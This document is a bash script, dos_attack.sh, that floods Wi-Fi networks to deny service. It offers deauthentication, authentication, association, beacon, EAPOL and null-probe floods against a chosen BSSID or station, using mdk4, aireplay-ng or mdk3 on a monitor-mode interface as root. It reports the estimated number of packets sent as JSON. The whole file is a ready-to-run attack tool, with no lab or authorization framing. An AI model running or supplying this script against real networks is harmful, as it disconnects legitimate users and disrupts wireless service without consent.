#!/usr/bin/env bash
# DoS flooding attacks
# Usage: dos_attack.sh <interface> <method> <target> [duration] [rate]
# Methods: auth, assoc, deauth, beacon, eapol, null

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    _log "[*] Cleaning up DoS attack..."
    if [[ -n "${MDK4_PID:-}" ]]; then
        kill "$MDK4_PID" 2>/dev/null || true
        wait "$MDK4_PID" 2>/dev/null || true
    fi
    if [[ -n "${AIREPLAY_PID:-}" ]]; then
        kill "$AIREPLAY_PID" 2>/dev/null || true
        wait "$AIREPLAY_PID" 2>/dev/null || true
    fi
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"
METHOD="${2:-deauth}"
TARGET="${3:-}"
DURATION="${4:-30}"
RATE="${5:-64}"

if [[ -z "$IFACE" ]]; then
    _die "Usage: dos_attack.sh <interface> <method> <target> [duration] [rate]"
fi

# Normalize method to lowercase
METHOD=$(echo "$METHOD" | tr '[:upper:]' '[:lower:]')

VALID_METHODS="auth assoc deauth beacon eapol null"
if ! echo "$VALID_METHODS" | grep -qw "$METHOD"; then
    _die "Invalid method '$METHOD'. Valid: $VALID_METHODS"
fi

if [[ -z "$TARGET" ]]; then
    _die "Target (BSSID or station) is required"
fi

TARGET=$(echo "$TARGET" | tr '[:lower:]' '[:upper:]')

# ── Validate interface ────────────────────────────────────────────────
if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

MODE=$(iw "$IFACE" info 2>/dev/null | awk '/type/{print $2}' || echo "unknown")
if [[ "$MODE" != "monitor" ]]; then
    _die "Interface $IFACE is not in monitor mode (current: $MODE)"
fi

# ── Rate limiting with mdk4 ──────────────────────────────────────────
case "$METHOD" in
    deauth)
        # mdk4 deauth flood
        if command -v mdk4 &>/dev/null; then
            _log "[*] Starting mdk4 deauth flood against $TARGET (rate: $RATE pps)..."
            mdk4 "$IFACE" d -E "$TARGET" -s "$RATE" 2>/dev/null &
            MDK4_PID=$!
        else
            _log "[!] mdk4 not found, using aireplay-ng"
            aireplay-ng -0 0 -a "$TARGET" --ignore-negative-one "$IFACE" 2>/dev/null &
            AIREPLAY_PID=$!
        fi
        ;;
    auth)
        if command -v mdk4 &>/dev/null; then
            _log "[*] Starting mdk4 auth flood against $TARGET (rate: $RATE pps)..."
            mdk4 "$IFACE" a -e "$TARGET" -s "$RATE" 2>/dev/null &
            MDK4_PID=$!
        else
            _die "mdk4 is required for auth flood"
        fi
        ;;
    assoc)
        if command -v mdk4 &>/dev/null; then
            _log "[*] Starting mdk4 assoc flood against $TARGET (rate: $RATE pps)..."
            mdk4 "$IFACE" a -s "$RATE" 2>/dev/null &
            MDK4_PID=$!
        else
            _die "mdk4 is required for assoc flood"
        fi
        ;;
    beacon)
        if command -v mdk4 &>/dev/null; then
            _log "[*] Starting mdk4 beacon flood on $TARGET (rate: $RATE pps)..."
            mdk4 "$IFACE" b -s "$RATE" 2>/dev/null &
            MDK4_PID=$!
        else
            _log "[!] mdk4 not found, using mdk3..."
            if command -v mdk3 &>/dev/null; then
                mdk3 "$IFACE" b -f /dev/null -s "$RATE" 2>/dev/null &
                MDK4_PID=$!
            else
                _die "Neither mdk4 nor mdk3 found for beacon flood"
            fi
        fi
        ;;
    eapol)
        if command -v mdk4 &>/dev/null; then
            _log "[*] Starting mdk4 EAPOL flood against $TARGET (rate: $RATE pps)..."
            mdk4 "$IFACE" e -t "$TARGET" -s "$RATE" 2>/dev/null &
            MDK4_PID=$!
        else
            _die "mdk4 is required for EAPOL flood"
        fi
        ;;
    null)
        if command -v mdk4 &>/dev/null; then
            _log "[*] Starting mdk4 null probe flood against $TARGET (rate: $RATE pps)..."
            mdk4 "$IFACE" p -s "$RATE" 2>/dev/null &
            MDK4_PID=$!
        else
            _die "mdk4 is required for null/probe flood"
        fi
        ;;
esac

# ── Wait for duration ─────────────────────────────────────────────────
sleep 1

if [[ -n "${MDK4_PID:-}" ]] || [[ -n "${AIREPLAY_PID:-}" ]]; then
    _log "[*] Flooding in progress for $DURATION seconds..."

    # Estimate packets sent
    PACKETS_SENT=0
    END_TIME=$(( $(date +%s) + DURATION ))

    while [[ $(date +%s) -lt $END_TIME ]]; do
        sleep 5

        # Try to estimate packet count from mdk4 output
        if [[ -n "${MDK4_PID:-}" && -n "$(ls /proc/${MDK4_PID}/fd 2>/dev/null)" ]]; then
            PACKETS_SENT=$(( RATE * (DURATION - (END_TIME - $(date +%s))) ))
        fi
        _log "[*] Attack running... estimated packets sent: $PACKETS_SENT"
    done

    # Final estimate
    PACKETS_SENT=$(( RATE * DURATION ))

    # Stop attack
    if [[ -n "${MDK4_PID:-}" ]]; then
        kill "$MDK4_PID" 2>/dev/null || true
        wait "$MDK4_PID" 2>/dev/null || true
        MDK4_PID=""
    fi
    if [[ -n "${AIREPLAY_PID:-}" ]]; then
        kill "$AIREPLAY_PID" 2>/dev/null || true
        wait "$AIREPLAY_PID" 2>/dev/null || true
        AIREPLAY_PID=""
    fi
else
    _die "Attack failed to start"
fi

# ── Output ────────────────────────────────────────────────────────────
_json "{\"status\":\"success\",\"method\":\"${METHOD}\",\"target\":\"${TARGET}\",\"interface\":\"${IFACE}\",\"packets_sent\":${PACKETS_SENT},\"duration\":${DURATION},\"rate\":${RATE}}"
